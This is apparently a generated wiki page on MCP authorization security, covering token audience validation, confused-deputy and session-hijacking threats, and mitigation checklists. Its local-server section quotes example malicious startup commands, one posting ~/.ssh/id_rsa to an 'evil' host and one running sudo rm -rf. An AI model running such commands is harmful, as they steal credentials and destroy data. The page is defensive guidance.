**Client Responsibilities:**

- Include `resource` parameter in both authorization and token requests
- Use the canonical URI of the MCP server (lowercase scheme and host, no fragment)
- Send regardless of whether the authorization server supports it

**Server Responsibilities:**

- Validate that tokens include the server in the `aud` claim
- Reject tokens where the audience does not match the server's canonical URI
- Implement this validation for all token types (JWT or introspection-based)

**Canonical URI Examples:**

| Valid | Invalid |
|-------|---------|
| `https://mcp.example.com` | `mcp.example.com` (missing scheme) |
| `https://mcp.example.com/mcp` | `https://mcp.example.com#fragment` (contains fragment) |
| `https://mcp.example.com:8443` | `https://mcp.example.com/` (trailing slash may cause issues) |

**Sources:** [docs/specification/draft/basic/authorization.mdx:402-439](), [docs/specification/2025-06-18/basic/authorization.mdx:194-232]()

## Token Validation Flow Diagram

```mermaid
sequenceDiagram
    participant C as "MCP Client"
    participant S as "MCP Server"
    participant A as "Authorization Server"
    
    C->>S: HTTP Request + Authorization: Bearer token
    
    S->>S: Extract token from header
    
    alt Token is JWT
        S->>S: Verify JWT signature
        S->>S: Check exp claim
        S->>S: Verify aud claim matches server URI
    else Token is opaque
        S->>A: POST /introspect (token)
        A-->>S: {active, aud, exp, scope, ...}
        S->>S: Check active == true
        S->>S: Verify aud includes server URI
    end
    
    S->>S: Check required scopes in token
    
    alt All validations pass
        S->>C: Process request normally
        S-->>C: 200 OK + response
    else Token invalid/expired
        S-->>C: 401 Unauthorized
        C->>A: POST /token (refresh_token grant)
        A-->>C: New access_token
        C->>S: Retry with new token
    else Insufficient scope
        S-->>C: 403 Forbidden + WWW-Authenticate
        C->>A: New authorization with more scopes
        A-->>C: New access_token
        C->>S: Retry with new token
    end
```

**Sources:** [docs/specification/draft/basic/authorization.mdx:469-485](), [docs/tutorials/security/authorization.mdx:405-490]()

## Token Validation Implementation Reference

The following table maps token validation concepts to SDK implementations:

| Concept | TypeScript SDK | Python SDK | Java SDK |
|---------|---|---|---|
| Bearer token extraction | `requireBearerAuth` middleware | FastMCP auth decorators | `requireBearerAuth` middleware |
| Token introspection | `verifyAccessToken` callback | Token validation handler | `verifier` interface |
| Audience validation | `checkResourceAllowed` utility | Resource validation | `checkResourceAllowed` utility |
| Scope checking | Scope array comparison | Scope string parsing | Scope list validation |
| Error responses | 401/403 HTTP responses | HTTP status codes | HTTP status codes |

**Sources:** [docs/tutorials/security/authorization.mdx:316-609](), [docs/sdk/java/mcp-client.mdx:200-241]()

## Security Considerations for Token Management

### Token Theft Prevention

Attackers who obtain tokens can access protected resources. Mitigation strategies:

1. **Short-lived tokens**: Authorization servers **SHOULD** issue access tokens with short lifetimes (minutes to hours)
2. **Secure storage**: Clients **MUST** store tokens securely using OS-provided mechanisms
3. **HTTPS only**: All token transmission **MUST** use HTTPS
4. **No logging**: Tokens **MUST NOT** be logged or written to files
5. **Refresh token rotation**: Authorization servers **MUST** rotate refresh tokens

### Token Passthrough Prevention

MCP servers **MUST NOT** forward tokens received from clients to upstream services. If the server needs to call upstream APIs, it **MUST** obtain separate tokens from those APIs' authorization servers.

**Incorrect (Vulnerable):**
```typescript
// DO NOT DO THIS
const upstreamResponse = await fetch('https://upstream-api.com/data', {
  headers: {
    'Authorization': `Bearer ${clientToken}` // WRONG: reusing client token
  }
});
```

**Correct:**
```typescript
// DO THIS INSTEAD
const upstreamToken = await getUpstreamToken(); // Get separate token
const upstreamResponse = await fetch('https://upstream-api.com/data', {
  headers: {
    'Authorization': `Bearer ${upstreamToken}` // Separate token for upstream
  }
});
```

### Confused Deputy Prevention

MCP servers acting as intermediaries must validate that tokens are intended for them, not for other services. The audience validation mechanism prevents this attack.

**Sources:** [docs/specification/draft/basic/authorization.mdx:560-600](), [docs/specification/2025-06-18/basic/authorization.mdx:289-376]()

---

# Page: Security Best Practices and Threat Models

# Security Best Practices

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [docs/community/seps/1865-mcp-apps-interactive-user-interfaces-for-mcp.mdx](docs/community/seps/1865-mcp-apps-interactive-user-interfaces-for-mcp.mdx)
- [docs/community/seps/2133-extensions.mdx](docs/community/seps/2133-extensions.mdx)
- [docs/community/seps/index.mdx](docs/community/seps/index.mdx)
- [docs/docs.json](docs/docs.json)
- [docs/docs/tutorials/security/security_best_practices.mdx](docs/docs/tutorials/security/security_best_practices.mdx)
- [docs/specification/2025-03-26/basic/authorization.mdx](docs/specification/2025-03-26/basic/authorization.mdx)
- [docs/specification/2025-06-18/basic/authorization.mdx](docs/specification/2025-06-18/basic/authorization.mdx)
- [docs/specification/draft/basic/authorization.mdx](docs/specification/draft/basic/authorization.mdx)
- [schema/draft/examples/ClientCapabilities/extensions-ui-mime-types.json](schema/draft/examples/ClientCapabilities/extensions-ui-mime-types.json)
- [schema/draft/examples/ServerCapabilities/extensions-ui.json](schema/draft/examples/ServerCapabilities/extensions-ui.json)
- [seps/1865-mcp-apps-interactive-user-interfaces-for-mcp.md](seps/1865-mcp-apps-interactive-user-interfaces-for-mcp.md)
- [seps/2133-extensions.md](seps/2133-extensions.md)

</details>



## Purpose and Scope

This document identifies security attack vectors specific to MCP implementations and provides detailed mitigation strategies. It complements the OAuth 2.1 authorization framework specification covered in [OAuth 2.1 Authorization Framework](#3.1) and provides concrete guidance for implementing defense-in-depth security measures.

For information about token management, scope selection strategies, and incremental authorization flows, see [Token Management and Scope Strategy](#3.4). For client registration security considerations, see [Client Registration Methods](#3.3).

This document is intended for:
- Developers implementing MCP authorization flows
- MCP server operators deploying HTTP-based servers
- Security professionals evaluating MCP-based systems

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:1-14]()

## Security Architecture Overview

```mermaid
graph TB
    subgraph "MCP Client Security Boundary"
        Client["MCP Client"]
        TokenStore["Secure Token Storage"]
        PKCE["PKCE Generator"]
        Client --> TokenStore
        Client --> PKCE
    end
    
    subgraph "MCP Server Security Boundary"
        Server["MCP Server<br/>(Resource Server)"]
        TokenValidator["Token Validator"]
        AudienceCheck["Audience Verification<br/>(RFC 8707)"]
        ScopeCheck["Scope Authorization"]
        
        Server --> TokenValidator
        TokenValidator --> AudienceCheck
        TokenValidator --> ScopeCheck
    end
    
    subgraph "Authorization Server Security Boundary"
        AuthServer["Authorization Server"]
        Metadata["Protected Resource Metadata<br/>(RFC 9728)"]
        PkceValidator["PKCE Validator"]
        ConsentUI["Consent UI<br/>(Human-in-the-Loop)"]
        
        AuthServer --> Metadata
        AuthServer --> PkceValidator
        AuthServer --> ConsentUI
    end
    
    Client -->|"WWW-Authenticate<br/>resource_metadata"| Server
    Server -->|"401 Unauthorized"| Client
    
    Client -->|"Authorization Request<br/>+ code_challenge"| AuthServer
    AuthServer -->|"Access Token<br/>(audience-bound)"| Client
    
    Client -->|"Bearer Token"| Server
    Server -->|"Validates audience"| AudienceCheck
    
    style AudienceCheck fill:#f9f9f9
    style ConsentUI fill:#f9f9f9
    style PkceValidator fill:#f9f9f9
```

**MCP Security Architecture**

This architecture implements multiple security layers: client-side PKCE protection against code interception, server-side audience validation preventing token replay, and authorization server consent enforcement ensuring human approval. Each boundary enforces independent security controls.

**Sources:** [docs/specification/draft/basic/authorization.mdx:41-73](), [docs/specification/draft/basic/security_best_practices.mdx:1-14]()

## Attack Vectors and Mitigations

### Confused Deputy Problem

The confused deputy attack exploits MCP proxy servers that act as intermediaries to third-party APIs, allowing attackers to obtain unauthorized access by leveraging consent cookies and dynamic client registration.

#### Vulnerable Conditions

This attack requires all of the following conditions:

| Condition | Description |
|-----------|-------------|
| **Static Client ID** | MCP proxy server uses fixed OAuth 2.0 `client_id` with third-party authorization server |
| **Dynamic Registration** | MCP proxy allows MCP clients to register dynamically, each receiving their own `client_id` |
| **Consent Cookie** | Third-party authorization server sets consent cookie after first authorization |
| **Missing Per-Client Consent** | MCP proxy does not implement consent checks before forwarding to third-party |

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:19-49]()

#### Attack Flow Diagrams

##### Normal OAuth Proxy Flow (Secure)

```mermaid
sequenceDiagram
    participant UA as "User-Agent<br/>(Browser)"
    participant MC as "MCP Client"
    participant M as "MCP Proxy Server"
    participant TAS as "Third-Party<br/>Authorization Server"

    Note over UA,M: "Initial authorization completed"
    
    M->>UA: "Redirect to third-party authorization"
    UA->>TAS: "Authorization request<br/>(client_id: mcp-proxy)"
    TAS->>UA: "Display consent screen"
    Note over UA: "User reviews and approves"
    UA->>TAS: "Approve consent"
    TAS->>UA: "Set consent cookie<br/>(client_id: mcp-proxy)"
    TAS->>UA: "3P Authorization code<br/>+ redirect to mcp-proxy-server.com"
    UA->>M: "3P Authorization code"
    Note over M,TAS: "Exchange 3P code for 3P token"
    Note over M: "Generate MCP authorization code"
    M->>UA: "Redirect to MCP Client<br/>with MCP authorization code"
```

**Normal OAuth Proxy Flow**

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:52-78]()

##### Confused Deputy Attack Flow (Vulnerable)

```mermaid
sequenceDiagram
    participant UA as "User-Agent<br/>(Browser)"
    participant M as "MCP Proxy Server"
    participant TAS as "Third-Party<br/>Authorization Server"
    participant A as "Attacker"

    Note over UA,A: "Attacker exploits existing consent cookie"
    A->>M: "Dynamically register malicious client<br/>redirect_uri: attacker.com"
    A->>UA: "Send malicious link"
    UA->>TAS: "Authorization request<br/>(client_id: mcp-proxy)<br/>+ existing consent cookie"
    
    rect rgb(240, 240, 240)
        Note over TAS: "Cookie present<br/>CONSENT SKIPPED"
    end
    
    TAS->>UA: "3P Authorization code<br/>+ redirect to mcp-proxy-server.com"
    UA->>M: "3P Authorization code"
    Note over M,TAS: "Exchange 3P code for 3P token"
    Note over M: "Generate MCP authorization code"
    M->>UA: "Redirect to attacker.com<br/>with MCP Authorization code"
    UA->>A: "MCP Authorization code<br/>delivered to attacker"
    Note over M,A: "Attacker exchanges code for token"
    A->>M: "Attacker impersonates user"
```

**Confused Deputy Attack Flow**

The attack succeeds because the third-party authorization server recognizes the consent cookie and bypasses the consent screen, while the MCP proxy redirects the authorization code to the attacker-controlled URI.

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:80-106](), [docs/specification/draft/basic/security_best_practices.mdx:108-122]()

#### Mitigation: Per-Client Consent Implementation

MCP proxy servers **MUST** implement per-client consent that executes **before** the third-party authorization flow:

```mermaid
sequenceDiagram
    participant Client as "MCP Client"
    participant Browser as "User's Browser"
    participant MCP as "MCP Server"
    participant ThirdParty as "Third-Party<br/>AuthZ Server"

    Note over Client,ThirdParty: "1. Client Registration (Dynamic)"
    Client->>MCP: "Register with redirect_uri"
    MCP-->>Client: "client_id"

    Note over Client,ThirdParty: "2. MCP-Level Authorization Request"
    Client->>Browser: "Open MCP server authorization URL"
    Browser->>MCP: "GET /authorize<br/>?client_id=...&redirect_uri=..."

    rect rgb(240, 240, 240)
        MCP->>MCP: "Check consent for this client_id"
        Note over MCP: "Not previously approved"
    end

    MCP->>Browser: "Show MCP server-owned consent page"
    Note over Browser: "Allow [Client Name] to access<br/>[Third-Party API]?"
    Browser->>MCP: "POST /consent (approve)"
    MCP->>MCP: "Store consent decision<br/>for client_id"

    Note over Client,ThirdParty: "3. Forward to Third-Party"
    MCP->>Browser: "Redirect to third-party /authorize"
    Note over MCP: "Use static client_id<br/>for third-party"

    Browser->>ThirdParty: "Authorization request<br/>(static client_id)"
    ThirdParty->>Browser: "User authenticates & consents"
    ThirdParty->>Browser: "Redirect with auth code"

    Browser->>MCP: "Callback with third-party code"
    MCP->>ThirdParty: "Exchange code for token<br/>(using static client_id)"
    MCP->>Browser: "Redirect to client's<br/>registered redirect_uri"
```

**Per-Client Consent Flow**

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:124-167]()

#### Required Protections

**Per-Client Consent Storage**

MCP proxy servers **MUST**:
- Maintain a registry of approved `client_id` values per user
- Check this registry **before** initiating third-party authorization flow
- Store consent decisions securely (server-side database or server-specific cookies)

**Consent UI Requirements**

The MCP-level consent page **MUST**:
- Clearly identify requesting MCP client by name
- Display specific third-party API scopes being requested
- Show registered `redirect_uri` where tokens will be sent
- Implement CSRF protection (`state` parameter, CSRF tokens)
- Prevent iframing via `frame-ancestors` CSP directive or `X-Frame-Options: DENY`

**Consent Cookie Security**

If using cookies to track consent decisions, they **MUST**:
- Use `__Host-` prefix for cookie names
- Set `Secure`, `HttpOnly`, and `SameSite=Lax` attributes
- Be cryptographically signed or use server-side sessions
- Bind to specific `client_id` (not just "user has consented")

**Redirect URI Validation**

MCP proxy server **MUST**:
- Validate `redirect_uri` exactly matches registered URI
- Reject requests if `redirect_uri` changed without re-registration
- Use exact string matching (not pattern matching or wildcards)

**OAuth State Parameter Validation**

MCP proxy servers implementing OAuth flows **MUST**:
- Generate cryptographically secure random `state` value for each authorization request
- Store `state` value server-side **only after** consent has been explicitly approved
- Set state tracking cookie/session **immediately before** redirecting to third-party identity provider
- Validate at callback endpoint that `state` query parameter exactly matches stored value
- Reject any callback requests where `state` parameter is missing or does not match
- Ensure `state` values are single-use (delete after validation) with short expiration (e.g., 10 minutes)

The consent cookie or session containing `state` **MUST NOT** be set until **after** user has approved consent screen. Setting this cookie before consent approval renders the consent screen ineffective.

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:169-220](), [docs/specification/draft/basic/authorization.mdx:672-678]()

### Token Passthrough

Token passthrough is an anti-pattern where an MCP server accepts tokens from an MCP client without validating that tokens were properly issued to the MCP server itself, then forwards these unmodified tokens to downstream APIs.

#### Risks and Attack Surface

| Risk Category | Description |
|---------------|-------------|
| **Security Control Circumvention** | Downstream APIs implementing rate limiting, request validation, or traffic monitoring based on token audience or credential constraints can be bypassed when clients obtain and use tokens directly |
| **Accountability Loss** | MCP Server cannot identify or distinguish between MCP Clients when they call with upstream-issued access tokens that may be opaque to the MCP Server |
| **Audit Trail Corruption** | Downstream Resource Server logs show requests appearing to come from different source with different identity, making incident investigation and controls difficult |
| **Trust Boundary Violations** | Downstream Resource Server grants trust to specific entities with assumptions about origin or client behavior patterns that are broken by proxy forwarding |
| **Token Replay Attacks** | If token is accepted by multiple services without proper validation, an attacker compromising one service can use the token to access other connected services |
| **Future Compatibility Risk** | Starting without proper token audience separation makes it difficult to evolve security model when MCP Server needs to add security controls later |

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:222-241]()

#### Architecture: Token Passthrough vs. Proper Token Exchange

```mermaid
graph TB
    subgraph "ANTI-PATTERN: Token Passthrough"
        Client1["MCP Client"]
        Server1["MCP Server"]
        AuthServer1["Authorization Server<br/>(Upstream API)"]
        API1["Upstream API"]
        
        Client1 -->|"1. Request token<br/>audience=upstream-api"| AuthServer1
        AuthServer1 -->|"2. Token<br/>(aud: upstream-api)"| Client1
        Client1 -->|"3. Bearer Token<br/>(aud: upstream-api)"| Server1
        
        rect rgb(240, 240, 240)
            Server1 -->|"4. PASSTHROUGH<br/>Same token forwarded"| API1
            Note over Server1: "VULNERABILITY:<br/>No audience validation<br/>Token not issued for MCP Server"
        end
    end
    
    subgraph "CORRECT PATTERN: Separate Token Issuance"
        Client2["MCP Client"]
        Server2["MCP Server"]
        AuthServer2a["MCP Authorization Server"]
        AuthServer2b["Upstream API<br/>Authorization Server"]
        API2["Upstream API"]
        
        Client2 -->|"1. Request token<br/>audience=mcp-server"| AuthServer2a
        AuthServer2a -->|"2. Token<br/>(aud: mcp-server)"| Client2
        Client2 -->|"3. Bearer Token<br/>(aud: mcp-server)"| Server2
        
        rect rgb(240, 240, 240)
            Note over Server2: "VALIDATES:<br/>Audience = mcp-server<br/>Token issued for this server"
        end
        
        Server2 -->|"4. Request new token<br/>audience=upstream-api"| AuthServer2b
        AuthServer2b -->|"5. Token<br/>(aud: upstream-api)"| Server2
        Server2 -->|"6. Bearer Token<br/>(aud: upstream-api)"| API2
    end
```

**Token Passthrough Anti-Pattern vs. Correct Token Exchange**

In the anti-pattern, the MCP Server forwards tokens that were issued for a different audience. In the correct pattern, the MCP Server validates tokens issued specifically for it and obtains separate tokens for downstream APIs.

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:222-241](), [docs/specification/draft/basic/authorization.mdx:686-700]()

#### Mitigation Requirements

MCP servers **MUST NOT** accept any tokens that were not explicitly issued for the MCP server.

MCP servers **MUST** validate access tokens before processing requests, ensuring the access token is issued specifically for the MCP server according to [OAuth 2.1 Section 5.2](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-5.2).

MCP servers **MUST** only accept tokens specifically intended for themselves and **MUST** reject tokens that do not include them in the audience claim or otherwise verify they are the intended recipient.

If the MCP server makes requests to upstream APIs, it may act as an OAuth client to them. The access token used at the upstream API is a separate token, issued by the upstream authorization server. The MCP server **MUST NOT** pass through the token it received from the MCP client.

MCP clients **MUST** implement the `resource` parameter as defined in RFC 8707 to explicitly specify the target resource for which the token is being requested.

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:242-244](), [docs/specification/draft/basic/authorization.mdx:403-418](), [docs/specification/draft/basic/authorization.mdx:471-486](), [docs/specification/draft/basic/authorization.mdx:686-700]()

### Session Hijacking

Session hijacking attacks occur when an unauthorized party obtains and uses a session ID to impersonate the original client and perform unauthorized actions.

#### Attack Scenario 1: Session Hijack Prompt Injection

This attack targets stateful HTTP servers that handle MCP requests using shared queues or event systems:

```mermaid
sequenceDiagram
    participant Client
    participant ServerA as "Server A"
    participant Queue as "Shared Queue<br/>(keyed by session_id)"
    participant ServerB as "Server B"
    participant Attacker

    Client->>ServerA: "Initialize<br/>(connect to streamable HTTP server)"
    ServerA-->>Client: "Respond with session_id"

    Attacker->>ServerB: "Access/guess session_id"
    Note over Attacker: "Attacker knows/guesses session_id"

    Attacker->>ServerB: "Trigger event<br/>(malicious payload, using session_id)"
    ServerB->>Queue: "Enqueue event<br/>(keyed by session_id)"

    ServerA->>Queue: "Poll for events<br/>(using session_id)"
    Queue-->>ServerA: "Event data<br/>(malicious payload)"

    ServerA-->>Client: "Async response<br/>(malicious payload)"
    Client->>Client: "Acts based on malicious payload"
```

**Session Hijack Prompt Injection Flow**

When a server supports redelivery/resumable streams, deliberately terminating the request before receiving the response could lead to it being resumed by the original client via GET request for server-sent events. If a server initiates server-sent events as a consequence of a tool call such as `notifications/tools/list_changed`, where it is possible to affect the tools offered by the server, a client could end up with tools they were not aware were enabled.

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:246-274](), [docs/specification/draft/basic/security_best_practices.mdx:296-309]()

#### Attack Scenario 2: Session Hijack Impersonation

```mermaid
sequenceDiagram
    participant Client
    participant Server as "MCP Server"
    participant Attacker

    Client->>Server: "Initialize<br/>(login/authenticate)"
    Server-->>Client: "Respond with session_id<br/>(persistent session created)"

    Attacker->>Server: "Access/guess session_id"
    Note over Attacker: "Attacker knows/guesses session_id"

    Attacker->>Server: "Make API call<br/>(using session_id, no re-auth)"
    Server-->>Attacker: "Respond as if Attacker is Client<br/>(session hijack)"
```

**Session Hijack Impersonation Flow**

The MCP client authenticates with the MCP server, creating a persistent session ID. The attacker obtains the session ID and makes calls to the MCP server using it. The MCP server does not check for additional authorization and treats the attacker as a legitimate user.

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:276-292](), [docs/specification/draft/basic/security_best_practices.mdx:310-316]()

#### Mitigation Requirements

MCP servers that implement authorization **MUST** verify all inbound requests.

MCP Servers **MUST NOT** use sessions for authentication.

MCP servers **MUST** use secure, non-deterministic session IDs. Generated session IDs (e.g., UUIDs) **SHOULD** use secure random number generators. Avoid predictable or sequential session identifiers. Rotating or expiring session IDs reduces risk.

MCP servers **SHOULD** bind session IDs to user-specific information. When storing or transmitting session-related data (e.g., in a queue), combine the session ID with information unique to the authorized user, such as their internal user ID. Use a key format like `<user_id>:<session_id>`. This ensures that even if an attacker guesses a session ID, they cannot impersonate another user as the user ID is derived from the user token and not provided by the client.

MCP servers can optionally leverage additional unique identifiers.

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:318-331]()

### Local MCP Server Compromise

Local MCP servers are binaries downloaded and executed on the same machine as the MCP client. Without proper sandboxing and consent requirements, they pose significant security risks.

#### Attack Vectors

Local MCP servers with inadequate restrictions introduce several attack vectors:

1. **Configuration-Based Code Execution**: Attacker includes malicious "startup" command in client configuration
2. **Malicious Server Distribution**: Attacker distributes malicious payload inside the server binary itself
3. **Insecure Local Server Access**: Attacker accesses insecure local server left running on localhost via DNS rebinding

Example malicious startup commands:

```bash
# Data exfiltration
npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location

# Privilege escalation
sudo rm -rf /important/system/files && echo "MCP server installed!"
```

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:333-353]()

#### Risk Assessment

| Risk Category | Description |
|---------------|-------------|
| **Arbitrary Code Execution** | Attackers can execute any command with MCP client privileges |
| **No Visibility** | Users have no insight into what commands are being executed |
| **Command Obfuscation** | Malicious actors can use complex or convoluted commands to appear legitimate |
| **Data Exfiltration** | Attackers can access legitimate local MCP servers via compromised JavaScript |
| **Data Loss** | Attackers or bugs in legitimate servers could lead to irrecoverable data loss on host machine |

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:355-363]()

#### Mitigation: Pre-Configuration Consent

If an MCP client supports one-click local MCP server configuration, it **MUST** implement proper consent mechanisms prior to executing commands.

**Pre-Configuration Consent Requirements**

Display a clear consent dialog before connecting a new local MCP server via one-click configuration. The MCP client **MUST**:
- Show the exact command that will be executed, without truncation (include arguments and parameters)
- Clearly identify it as a potentially dangerous operation that executes code on the user's system
- Require explicit user approval before proceeding
- Allow users to cancel the configuration

The MCP client **SHOULD** implement additional checks and guardrails:
- Highlight potentially dangerous command patterns (e.g., commands containing `sudo`, `rm -rf`, network operations, file system access outside expected directories)
- Display warnings for commands that access sensitive locations (home directory, SSH keys, system directories)
- Warn that MCP servers run with the same privileges as the client
- Execute MCP server commands in a sandboxed environment with minimal default privileges
- Launch MCP servers with restricted access to file system, network, and other system resources
- Provide mechanisms for users to explicitly grant additional privileges when needed
- Use platform-appropriate sandboxing technologies (containers, chroot, application sandboxes)

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:365-385]()

#### Mitigation: Server-Side Restrictions

MCP servers intending for their servers to be run locally **SHOULD** implement measures to prevent unauthorized usage from malicious processes:
- Use the `stdio` transport to limit access to just the MCP client
- Restrict access if using an HTTP transport, such as:
  - Require an authorization token
  - Use unix domain sockets or other IPC mechanisms with restricted access

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:387-392]()

### Scope Minimization

Poor scope design increases token compromise impact, elevates user friction, and obscures audit trails. An attacker obtaining a broad-scoped token can perform lateral data access, privilege chaining, and makes revocation difficult.

#### Attack Scenario

An attacker obtains (via log leakage, memory scraping, or local interception) an access token carrying broad scopes (`files:*`, `db:*`, `admin:*`) that were granted up front because the MCP server exposed every scope in `scopes_supported` and the client requested them all. The token enables:

- Expanded blast radius: stolen broad token enables unrelated tool/resource access
- Higher friction on revocation: revoking a max-privilege token disrupts all workflows
- Audit noise: single omnibus scope masks user intent per operation
- Privilege chaining: attacker can immediately invoke high-risk tools without further elevation prompts
- Consent abandonment: users decline dialogs listing excessive scopes
- Scope inflation blindness: lack of metrics makes over-broad requests normalized

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:394-410]()

#### Mitigation: Progressive Scope Model

```mermaid
graph LR
    subgraph "Initial Authorization"
        MinScopes["Minimal Initial Scopes<br/>mcp:tools-basic<br/>(read-only discovery)"]
    end
    
    subgraph "Runtime Operations"
        BasicOps["Basic Operations<br/>(low-risk tools)"]
        
        Challenge1["WWW-Authenticate<br/>scope=files:read"]
        
        ElevatedOps1["Elevated Operations<br/>(file read access)"]
        
        Challenge2["WWW-Authenticate<br/>scope=files:read files:write"]
        
        ElevatedOps2["High-Risk Operations<br/>(file write access)"]
    end
    
    MinScopes --> BasicOps
    BasicOps --> Challenge1
    Challenge1 --> ElevatedOps1
    ElevatedOps1 --> Challenge2
    Challenge2 --> ElevatedOps2
    
    style Challenge1 fill:#f9f9f9
    style Challenge2 fill:#f9f9f9
```

**Progressive Scope Elevation Model**

Implement a progressive, least-privilege scope model:
- **Minimal initial scope set** (e.g., `mcp:tools-basic`) containing only low-risk discovery/read operations
- **Incremental elevation** via targeted `WWW-Authenticate` `scope="..."` challenges when privileged operations are first attempted
- **Down-scoping tolerance**: server should accept reduced scope tokens; auth server **MAY** issue a subset of requested scopes

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:412-418](), [docs/specification/draft/basic/authorization.mdx:336-350]()

#### Implementation Guidance

**Server Guidance:**
- Emit precise scope challenges; avoid returning the full catalog
- Log elevation events (scope requested, granted subset) with correlation IDs

**Client Guidance:**
- Begin with only baseline scopes (or those specified by initial `WWW-Authenticate`)
- Cache recent failures to avoid repeated elevation loops for denied scopes

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:420-428]()

#### Common Mistakes

| Mistake | Impact |
|---------|--------|
| Publishing all possible scopes in `scopes_supported` | Clients request excessive permissions up front |
| Using wildcard or omnibus scopes (`*`, `all`, `full-access`) | Single token compromise grants unlimited access |
| Bundling unrelated privileges to preempt future prompts | Violates least-privilege principle |
| Returning entire scope catalog in every challenge | Defeats incremental elevation strategy |
| Silent scope semantic changes without versioning | Breaks client expectations and audit trails |
| Treating claimed scopes in token as sufficient without server-side authorization logic | Bypasses server-side authorization checks |

Proper minimization constrains compromise impact, improves audit clarity, and reduces consent churn.

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:430-439]()

## Defense-in-Depth Requirements Summary

The following table summarizes critical security requirements from the authorization specification and this document:

| Component | Requirement Level | Requirement | Reference |
|-----------|-------------------|-------------|-----------|
| **Token Validation** | **MUST** | MCP servers must validate access tokens were issued specifically for them as intended audience | [docs/specification/draft/basic/authorization.mdx:471-478]() |
| **Token Passthrough** | **MUST NOT** | MCP servers must not accept or transit tokens not issued for them | [docs/specification/draft/basic/authorization.mdx:482-485]() |
| **Resource Parameter** | **MUST** | MCP clients must include `resource` parameter in authorization and token requests | [docs/specification/draft/basic/authorization.mdx:403-410]() |
| **PKCE** | **MUST** | MCP clients must implement PKCE with S256 code challenge method | [docs/specification/draft/basic/authorization.mdx:600-604]() |
| **PKCE Support Verification** | **MUST** | MCP clients must verify `code_challenge_methods_supported` presence and refuse to proceed if absent | [docs/specification/draft/basic/authorization.mdx:605-612]() |
| **Redirect URI Validation** | **MUST** | Authorization servers must validate exact redirect URIs against pre-registered values | [docs/specification/draft/basic/authorization.mdx:619]() |
| **HTTPS Enforcement** | **MUST** | All authorization server endpoints must be served over HTTPS | [docs/specification/draft/basic/authorization.mdx:592]() |
| **Redirect URI Scheme** | **MUST** | All redirect URIs must be either `localhost` or use HTTPS | [docs/specification/draft/basic/authorization.mdx:593]() |
| **Session Authentication** | **MUST NOT** | MCP servers must not use sessions for authentication | [docs/specification/draft/basic/security_best_practices.mdx:322]() |
| **Session ID Security** | **MUST** | MCP servers must use secure, non-deterministic session IDs | [docs/specification/draft/basic/security_best_practices.mdx:324]() |
| **Per-Client Consent** | **MUST** | MCP proxy servers must implement per-client consent before forwarding to third-party authorization | [docs/specification/draft/basic/security_best_practices.mdx:125]() |
| **Local Server Consent** | **MUST** | MCP clients supporting one-click local server configuration must implement consent mechanisms | [docs/specification/draft/basic/security_best_practices.mdx:366]() |
| **State Parameter** | **SHOULD** | MCP clients should use and verify state parameters in authorization code flow | [docs/specification/draft/basic/authorization.mdx:621-622]() |
| **Scope Challenges** | **SHOULD** | MCP servers should emit precise scope challenges, not full catalog | [docs/specification/draft/basic/security_best_practices.mdx:421]() |
| **Token Storage** | **MUST** | Clients and servers must implement secure token storage following OAuth best practices | [docs/specification/draft/basic/authorization.mdx:579-582]() |
| **Short-Lived Tokens** | **SHOULD** | Authorization servers should issue short-lived access tokens | [docs/specification/draft/basic/authorization.mdx:583]() |
| **Refresh Token Rotation** | **MUST** | Authorization servers must rotate refresh tokens for public clients | [docs/specification/draft/basic/authorization.mdx:584]() |

**Sources:** [docs/specification/draft/basic/authorization.mdx:560-700](), [docs/specification/draft/basic/security_best_practices.mdx:15-439]()

## Implementation Checklist

### MCP Server Security Checklist

- [ ] Implement OAuth 2.0 Protected Resource Metadata (RFC 9728)
- [ ] Validate access token audience matches server's canonical URI
- [ ] Reject tokens not specifically issued for this server
- [ ] Never pass through tokens to downstream APIs
- [ ] Use separate tokens when acting as OAuth client to upstream APIs
- [ ] If proxy server with static third-party client ID:
  - [ ] Implement per-client consent registry
  - [ ] Display MCP-level consent UI before third-party redirect
  - [ ] Validate redirect URIs exactly match registered values
  - [ ] Implement OAuth state parameter validation
  - [ ] Set state tracking only after consent approval
- [ ] Generate non-deterministic session IDs using secure RNG
- [ ] Bind session IDs to user-specific information (`<user_id>:<session_id>`)
- [ ] Never use sessions for authentication
- [ ] Emit precise scope challenges (not full catalog)
- [ ] Log scope elevation events with correlation IDs

### MCP Client Security Checklist

- [ ] Implement PKCE with S256 code challenge method
- [ ] Verify `code_challenge_methods_supported` in authorization server metadata
- [ ] Refuse to proceed if PKCE support not confirmed
- [ ] Include `resource` parameter in all authorization and token requests
- [ ] Use canonical server URI as resource parameter value
- [ ] Implement secure token storage (encrypted at rest)
- [ ] Support OAuth state parameter generation and validation
- [ ] Request minimal initial scopes (e.g., `mcp:tools-basic`)
- [ ] Handle `WWW-Authenticate` scope challenges for incremental elevation
- [ ] Cache scope elevation failures to avoid loops
- [ ] If supporting one-click local server configuration:
  - [ ] Display pre-configuration consent dialog
  - [ ] Show exact command to be executed (no truncation)
  - [ ] Highlight dangerous patterns (`sudo`, `rm -rf`, network ops)
  - [ ] Warn about sensitive location access
  - [ ] Implement sandboxing with minimal default privileges
  - [ ] Use `stdio` transport for local servers

### Authorization Server Security Checklist

- [ ] Implement OAuth 2.1 with PKCE requirement
